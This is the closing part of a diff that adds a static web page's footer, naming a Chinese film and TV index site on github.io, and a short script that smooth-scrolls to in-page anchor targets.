+    </div>
+    <div class="footer-bottom">
+      <p>影视工厂 yingshigongchang-top.github.io ｜ 四条产线分拣入库 ｜ 静态单页设计 ｜ 正规影视索引</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const h=this.getAttribute('href');
+    if(h==='#'){e.preventDefault();return;}
+    const t=document.querySelector(h);
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});}
+  });
+});
+</script>
+</body>
+</html>
